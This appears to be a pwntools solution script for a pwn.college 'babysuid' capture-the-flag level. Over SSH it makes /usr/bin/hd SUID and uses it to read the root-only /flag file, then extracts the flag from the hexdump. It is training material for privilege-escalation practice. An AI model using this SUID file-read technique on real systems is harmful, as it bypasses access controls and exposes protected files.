from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level12 to make /usr/bin/hd SUID
s.process("/challenge/babysuid_level12")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/hd /flag
# ? This is a bit overkill, through a normal shell is easier
# ? hd outputs the flag in hexdump format
# ? grep '|' to get the line with the flag
# ? cut -d'|' -f2 to get the second field (the flag)
# ? tr -d '\n' to remove the newline
# ? wrap the whole thing in echo to nicely print the flag
sh.sendline(b"echo $(hd /flag | grep '|' | cut -d'|' -f2 | tr -d '\n')")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
